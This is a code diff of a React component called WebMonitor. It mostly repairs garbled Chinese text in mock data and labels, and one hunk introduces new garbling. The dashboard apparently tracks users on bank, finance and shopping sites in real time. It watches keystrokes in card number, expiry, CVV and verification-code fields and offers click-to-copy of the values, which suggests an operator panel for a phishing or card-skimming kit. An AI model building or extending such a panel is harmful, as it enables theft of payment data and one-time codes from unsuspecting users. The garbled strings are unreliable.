@@ -113,7 +113,7 @@ const submissionData: UserSubmission[] = [
     websiteName: "金融服务平台",
     currentPage: "/profile/personal-info",
     userName: "张小明",
-    userLocation: "北京市���阳区",
+    userLocation: "北京市朝阳区",
     timestamp: "2024-01-20 10:25:16",
     progress: 85,
     progressText: "85%",
@@ -148,9 +148,9 @@ const submissionData: UserSubmission[] = [
     status: "processing",
     statusText: "处理中",
     submissionType: "credit_card",
-    websiteName: "电商��物网",
+    websiteName: "电商购物网",
     currentPage: "/checkout/payment",
-    userName: "李小���",
+    userName: "李小红",
     userLocation: "上海市浦东区",
     timestamp: "2024-01-20 10:23:45",
     progress: 72,
@@ -188,9 +188,9 @@ const submissionData: UserSubmission[] = [
     status: "pending_review",
     statusText: "待审核",
     submissionType: "identity_verification",
-    websiteName: "在线�����系统",
+    websiteName: "在线银行系统",
     currentPage: "/kyc/identity-check",
-    userName: "��大强",
+    userName: "王大强",
     userLocation: "广州市天河区",
     timestamp: "2024-01-20 10:20:33",
     riskLevel: "high",
@@ -213,7 +213,7 @@ const submissionData: UserSubmission[] = [
     dataSize: "128Kb",
     fieldsCount: 4,
     ipAddress: "192.168.1.200"
-    // 完全没有用户数据，用户刚进��页面
+    // 完全没有用户数据，用户刚进入页面
   }
 ];
 
@@ -233,7 +233,7 @@ const getSubmissionTypeName = (type: string) => {
     case "credit_card": return "信用卡信息";
     case "identity_verification": return "身份验证";
     case "address_proof": return "地址证明";
-    default: return "其他文���";
+    default: return "其他文档";
   }
 };
 
@@ -264,7 +264,7 @@ export function WebMonitor() {
         { id: 'documents', name: '文档上传', route: '/documents', isActive: false },
       ]
     },
-    "电商购物网": {
+    "电��购物网": {
       projectId: "ecommerce_site",
       pages: [
         { id: 'checkout', name: '结账页面', route: '/checkout', isActive: true },
@@ -380,7 +380,7 @@ export function WebMonitor() {
     if (diffHours > 0) {
       return `${prefix}${diffHours}小时前`;
     } else if (diffMinutes > 0) {
-      return `${prefix}${diffMinutes}���钟前`;
+      return `${prefix}${diffMinutes}分钟前`;
     } else {
       return `${prefix}${diffSeconds}秒前`;
     }
@@ -493,7 +493,7 @@ export function WebMonitor() {
 
                   <div className="flex items-center gap-1">
                     <span className="text-sm font-medium text-blue-600 border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
-                      当前����� {submission.currentPage === '/payment' ? '填卡页' :
+                      当前正在 {submission.currentPage === '/payment' ? '填卡页' :
                                 submission.currentPage === '/profile/personal-info' ? '个人信息页' :
                                 submission.currentPage === '/checkout/payment' ? '结账页' :
                                 submission.currentPage === '/kyc/identity-check' ? '身份验证页' :
@@ -576,7 +576,7 @@ export function WebMonitor() {
                         📊 数据分析页面
                       </DropdownMenuItem>
                       <DropdownMenuItem onClick={() => window.open('/reports', '_blank')}>
-                        📋 ��告页面
+                        📋 报告页面
                       </DropdownMenuItem>
                       <DropdownMenuItem onClick={() => window.open('/settings', '_blank')}>
                         ⚙️ 设置页面
@@ -589,7 +589,7 @@ export function WebMonitor() {
                         📝 日志页面
                       </DropdownMenuItem>
                       <DropdownMenuItem onClick={() => window.open('/users', '_blank')}>
-                        👥 ��户管理
+                        👥 用户管理
                       </DropdownMenuItem>
                     </DropdownMenuContent>
                   </DropdownMenu>
@@ -608,7 +608,7 @@ export function WebMonitor() {
                   submission.userName
                 );
 
-                // 检��是否有字段正在输入
+                // 检查是否有字段正在输入
                 const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                   isFieldTyping(submission.id, field)
                 );
@@ -741,7 +741,7 @@ export function WebMonitor() {
                           : 'border-gray-300 bg-gray-50'
                       }`}
                       onClick={() => copyToClipboard(getFieldValue(submission.id, 'expiryDate'))}
-                      title="��击复制有效期"
+                      title="点击复制有效期"
                     >
                       <span className="relative">
                         {getFieldValue(submission.id, 'expiryDate')}
